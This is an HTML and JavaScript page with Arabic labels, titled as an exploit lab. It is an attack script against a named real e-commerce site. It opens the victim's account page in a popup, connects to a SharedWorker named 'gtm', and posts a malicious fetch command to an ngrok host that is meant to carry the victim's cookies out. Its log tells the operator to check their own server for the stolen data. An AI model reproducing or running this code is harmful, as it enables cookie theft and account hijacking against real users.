<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Exploit Lab - Side-by-Side Attack</title>
    <style>
        body { font-family: sans-serif; padding: 30px; background: #2c3e50; color: white; }
        .container { max-width: 600px; margin: auto; background: #34495e; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .log { background: #000; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; height: 250px; overflow-y: auto; margin: 20px 0; border: 1px solid #1abc9c; }
        .btn { background: #e74c3c; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; margin-bottom: 10px; }
        .btn:hover { background: #c0392b; }
        .btn-secondary { background: #3498db; }
    </style>
</head>
<body>

<div class="container">
    <h2>مختبر اختراق: الهجوم المتزامن</h2>
    
    <button class="btn btn-secondary" onclick="openVictim()">1. فتح صفحة الضحية (تنشيط الهدف)</button>
    
    <button class="btn" onclick="executeExploit()">2. تنفيذ كود الاختطاف والتسريب</button>

    <div class="log" id="logWindow">
> في انتظار فتح صفحة الضحية...
    </div>
</div>

<script>
    let victimWindow = null;
    const logWindow = document.getElementById('logWindow');

    function addLog(text) {
        logWindow.innerText += `\n[${new Date().toLocaleTimeString()}] ${text}`;
        logWindow.scrollTop = logWindow.scrollHeight;
    }

    // الخطوة 1: فتح صفحة الضحية
    function openVictim() {
        const victimUrl = "https://www.zooplus.com/account/overview"; // رابط موقع الضحية الذي يحتوي على الكود 2 و 3
        addLog("جاري فتح صفحة الضحية في نافذة جديدة...");
        victimWindow = window.open(victimUrl, "_blank", "width=500,height=500");
        
        if (victimWindow) {
            addLog("تم فتح صفحة الضحية. الـ SharedWorker قيد الإنشاء الآن باسم 'gtm'...");
        } else {
            addLog("خطأ: تم حظر النافذة المنبثقة! يرجى السماح بها.");
        }
    }

    // الخطوة 2: الاتصال بالـ Worker وتنفيذ الكود
    function executeExploit() {
        addLog("محاولة الاتصال بالـ SharedWorker المستضاف لدى الضحية...");

        try {
            // الاتصال بالـ Worker عبر الاسم gtm
            const worker = new SharedWorker("", "gtm");
            const port = worker.port;

            port.onmessage = (e) => {
                addLog("استجابة مستلمة من الـ Worker: " + JSON.stringify(e.data));
            };

            port.start();
            addLog("تم الربط مع المنفذ (Port) بنجاح.");

            // صياغة الرسالة الخبيثة (مستوحى من الكود 2 و 3)
            const payload = {
                url: "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev?data=COOKIES_LEAKED",
                retryIntervals: [0, 500, 1000],
                commandType: 0
            };

            addLog("إرسال أمر الـ Fetch الخبيث... سيتم إرفاق Cookies الضحية آلياً.");
            port.postMessage(payload);
            addLog("تم الإرسال. تحقق من خادمك الخاص لاستلام البيانات.");

        } catch (err) {
            addLog("فشل الاتصال: " + err.message);
            addLog("ملاحظة: المتصفحات الحديثة قد تمنع مشاركة الـ SharedWorker عبر نطاقات مختلفة (Cross-Origin) ما لم تكن السياسات ضعيفة.");
        }
    }
</script>

</body>
</html>
